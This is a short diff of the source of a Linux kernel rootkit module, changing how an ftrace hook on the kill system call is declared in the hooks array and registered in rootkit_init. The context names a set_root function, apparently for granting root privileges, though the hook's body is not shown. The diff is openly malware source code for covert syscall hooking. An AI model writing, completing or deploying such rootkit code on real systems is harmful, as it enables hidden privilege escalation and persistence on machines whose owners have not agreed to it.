@@ -90,8 +90,7 @@ void set_root(void)
 
 /* Declare the struct that ftrace needs to hook the syscall */
 static struct ftrace_hook hooks[] = {
-    {0},
-    //HOOK("__x64_sys_kill", hook_kill, &orig_kill),
+    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
 };
 
 /* Module initialization function */
@@ -99,9 +98,7 @@ static int __init rootkit_init(void)
 {
     /* Hook the syscall and print to the kernel buffer */
     int err;
-    hooks[0].name = "__x64_sys_kill";
-    hooks[0].function = hook_kill;
-    hooks[0].original = &orig_kill;
+
     err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
     if(err)
         return err;
